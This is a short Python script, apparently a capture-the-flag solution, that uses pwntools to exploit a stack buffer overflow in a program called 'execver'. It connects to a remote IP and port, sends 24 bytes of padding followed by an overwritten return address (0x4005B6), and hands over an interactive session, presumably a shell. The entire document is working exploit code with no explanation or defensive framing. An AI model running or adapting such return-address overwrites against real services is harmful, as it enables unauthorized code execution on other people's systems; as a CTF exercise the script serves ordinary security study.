from pwn import *

#r = process('./execver')
r = remote('124.16.75.117',51002)

payload = "@" * 16
payload += "@@@@@@@@"
payload += p64(0x00000000004005B6)
payload += "a"

r.sendline(payload)
r.interactive()